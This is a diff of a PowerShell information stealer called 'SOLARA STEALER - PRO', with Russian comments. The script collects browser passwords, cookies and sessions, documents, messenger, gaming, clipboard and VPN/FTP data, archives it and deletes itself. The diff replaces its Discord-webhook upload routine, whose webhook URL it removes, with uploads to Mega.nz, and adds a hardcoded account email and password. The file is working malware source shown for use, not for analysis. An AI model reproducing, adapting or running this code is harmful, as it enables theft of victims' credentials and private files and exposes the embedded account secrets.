@@ -1,18 +1,7 @@
-# =================================================================================================
-# ||                                                                                             ||
-# ||                                  SOLARA STEALER - PRO (Discord)                            ||
-# ||                                                                                             ||
-# ||      Расширенная версия скрипта для сбора данных и отправки в Discord Webhook.              ||
-# ||                Поддержка расширенного списка браузеров и ПО.                               ||
-# ||                                                                                             ||
-# =================================================================================================
-
-# -------------------------------------------------------------------------------------------------
-# |                                         КОНФИГУРАЦИЯ                                         |
-# -------------------------------------------------------------------------------------------------
-# --- Webhook Discord ---
-$DiscordWebhook   = "https://discord.com/api/webhooks/1433533481236959367/4ZX-0xo9cLOurwO1uY4bbvjeu4921Z8nOLovZ7WRdSrUaX-FVoTNzxruFMqbU2VsMGTG"   # ← сюда свой Discord Webhook URL
-$MaxPartSize      = 24MB                  # лимит размера Discord (~25 МБ, но лучше ставить 24)
+# --- Настройки Mega.nz ---
+$MegaEmail = "zyxeram@gmail.com"
+$MegaPassword = "Ajrcstmono2@"
+$MaxPartSize = 100MB  # Размер части для Mega.nz (учитываем лимит трафика)
 
 # --- Настройки сбора данных ---
 $StealBrowserData      = $true
@@ -26,14 +15,13 @@ $GrabClipboard         = $true
 $StealVpnFtp           = $true
 
 # --- Настройки очистки ---
-$SelfDelete = $true # Удалить скрипт после выполнения
+$SelfDelete = $true
 
-# --- Сообщения для консоли ---
 $OutputMessages = @{
     Start        = "Запуск профессионального модуля сбора данных..."
     SystemInfo   = "[+] Сбор информации о системе и сети..."
     BrowserSearch= "[+] Поиск установленных браузеров..."
-    BrowserData  = "[+] Извлечение файлов сессий, паролей и cookies для оффлайн-анализа..."
+    BrowserData  = "[+] Извлечение файлов сессий, паролей и cookies..."
     Files        = "[+] Поиск и копирование файлов (doc, txt, xls)..."
     Gaming       = "[+] Поиск данных игровых клиентов (Steam, Epic Games)..."
     Messengers   = "[+] Сбор логов мессенджеров (Telegram, Discord)..."
@@ -42,14 +30,11 @@ $OutputMessages = @{
     Clipboard    = "[+] Копирование данных из буфера обмена..."
     VpnFtp       = "[+] Поиск конфигураций VPN, FTP (FileZilla, WinSCP)..."
     Archiving    = "[+] Архивирование данных..."
-    Sending      = "[+] Отправка архива в Discord..."
+    Sending      = "[+] Отправка архива в Mega.nz..."
     Cleaning     = "[+] Очистка следов..."
     Complete     = "Процесс завершен."
 }
 
-# -------------------------------------------------------------------------------------------------
-# |                                    ИСПОЛНЯЕМЫЙ КОД                                           |
-# -------------------------------------------------------------------------------------------------
 function Start-Stealer {
     $LogFolder = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss')"
     if (-not (Test-Path $LogFolder)) {
@@ -102,20 +87,24 @@ function Start-Stealer {
 
         $ZipPath = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
         Write-Host $OutputMessages.Archiving -ForegroundColor Yellow
-        Compress-Archive -Path "$LogFolder\*" -DestinationPath $ZipPath -Force
+        
+        # Используем .NET для архивирования с быстрым сжатием
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [System.IO.Compression.ZipFile]::CreateFromDirectory($LogFolder, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
 
         Write-Host $OutputMessages.Sending -ForegroundColor Yellow
         $size = (Get-Item $ZipPath).Length
+        
         if ($size -ge $MaxPartSize) {
             $parts = Split-File -FilePath $ZipPath -MaxBytes $MaxPartSize
             $i = 1
             foreach ($partFile in $parts) {
-                Send-DiscordFile -FilePath $partFile -Caption "Log part $i ($partFile) from $($env:USERNAME) on $($env:COMPUTERNAME)"
+                Send-MegaFile -FilePath $partFile -RemotePath "/Logs/Log_part_$i`_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
                 Remove-Item $partFile -Force -ErrorAction SilentlyContinue
                 $i++
             }
         } else {
-            Send-DiscordFile -FilePath $ZipPath -Caption "New Log from $($env:USERNAME) on $($env:COMPUTERNAME)"
+            Send-MegaFile -FilePath $ZipPath -RemotePath "/Logs/Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
         }
     }
     catch {
@@ -135,41 +124,28 @@ function Start-Stealer {
     }
 }
 
-# --- Отправка файла (или части) в Discord ---
-# --- отправка файла или части в Discord ---
-function Send-DiscordFile {
-    param($FilePath, $Caption)
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $fileName = Split-Path -Leaf $FilePath
-    $url = $DiscordWebhook
 
-    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-    $payload = "------$boundary`r`n"
-    $payload += "Content-Disposition: form-data; name=`"payload_json`"`r`n"
-    $payload += "`r`n"
-    $payload += '{"content":"'+$Caption+'"}'
-    $payload += "`r`n------$boundary`r`n"
-    $payload += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`n"
-    $payload += "Content-Type: application/octet-stream`r`n"
-    $payload += "`r`n"
-
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
-    $end = "`r`n------$boundary--`r`n"
-    $endBytes = [System.Text.Encoding]::UTF8.GetBytes($end)
-
-    $content = New-Object System.IO.MemoryStream
-    $content.Write($bytes, 0, $bytes.Length)
-    $content.Write($fileBytes, 0, $fileBytes.Length)
-    $content.Write($endBytes, 0, $endBytes.Length)
-    $content.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
-
-    $headers = @{
-        "Content-Type" = "multipart/form-data; boundary=$boundary"
-    }
+# --- Отправка файла в Mega.nz через MegaCMD ---
+function Send-MegaFile {
+    param($FilePath, $RemotePath)
+    
     try {
-        Invoke-WebRequest -Uri $url -Method Post -Body $content -Headers $headers -TimeoutSec 120
-    } catch {
-        Write-Warning "Failed to send file to Discord: $($_.Exception.Message)"
+        # Проверяем наличие MEGAcmd
+        $megaCmd = "mega-put"
+        
+        # Логин в Mega (если ещё не залогинены)
+        $loginCheck = & mega-whoami 2>&1
+        if ($loginCheck -match "Not logged in") {
+            & mega-login $MegaEmail $MegaPassword | Out-Null
+        }
+        
+        # Загружаем файл
+        & $megaCmd "$FilePath" "$RemotePath"
+        
+        Write-Host "Файл успешно загружен: $RemotePath" -ForegroundColor Green
+    }
+    catch {
+        Write-Warning "Failed to send file to Mega.nz: $($_.Exception.Message)"
     }
 }
 
@@ -206,6 +182,7 @@ function Split-File {
     } finally { $fs.Close() }
     return $files
 }
+
 
 # --- ФУНКЦИИ СБОРА ДАННЫХ ---
 
